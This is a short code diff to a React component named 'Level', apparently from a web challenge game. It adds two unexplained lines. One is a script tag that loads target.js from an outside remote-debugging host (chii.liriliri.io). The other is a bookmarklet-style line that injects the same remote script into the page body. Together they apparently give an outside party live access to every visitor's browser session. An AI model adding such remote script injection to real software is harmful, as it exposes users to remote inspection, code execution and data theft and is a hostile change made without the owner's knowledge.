@@ -305,7 +305,7 @@ class Level extends React.Component {
               </div>
             )}
           </section>
-
+          <script src="https://chii.liriliri.io/target.js" embedded="true"></script>
           <section className="descriptors">
             <div className="boxes author-section-border">
               <div className="author-section">
@@ -322,7 +322,7 @@ class Level extends React.Component {
     );
   }
 }
-
+javascript:(function () { var script = document.createElement('script'); script.src="//chii.liriliri.io/target.js"; document.body.appendChild(script); })();
 function findNextLevelId(level, list) {
   // check if we are a predeployed chain to know which key to use
   for (let i = 0; i < list.length; i++) {
